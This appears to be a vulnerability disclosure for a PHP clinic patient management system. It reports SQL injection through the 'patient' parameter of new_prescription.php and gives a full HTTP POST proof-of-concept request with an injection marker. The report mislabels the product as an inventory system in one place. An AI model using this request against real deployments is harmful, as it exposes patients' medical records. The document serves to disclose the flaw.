## Clinic's Patient Management System has SQL injection vulnerability
## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/new_prescription.php
## describe
Unrestricted SQL injection attacks exist in the inventory management system. The parameters that can be controlled are as follows:  patient  This function executes the patient parameter into an SQL statement without any restrictions. Malicious attackers can use this vulnerability to obtain sensitive information in the server database
## code analysis
The patient parameter in new_prescription.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection

<img width="1296" alt="image" src="https://github.com/user-attachments/assets/f6d3187c-3986-4c61-b3c8-b1f9c48175f2">


Injection via the parameter parameter
POC
```
POST /pms/new_prescription.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/new_prescription.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

patient=12*&visit_date=08%2F04%2F2024&next_visit_date=08%2F06%2F2024&bp=22&weight=22&disease=22&submit=
```

<img width="959" alt="image" src="https://github.com/user-attachments/assets/685146dd-e75b-49e6-b577-55f164daf0d9">


<img width="917" alt="image" src="https://github.com/user-attachments/assets/39268f96-268c-4de7-b001-bd3475e23eb3">



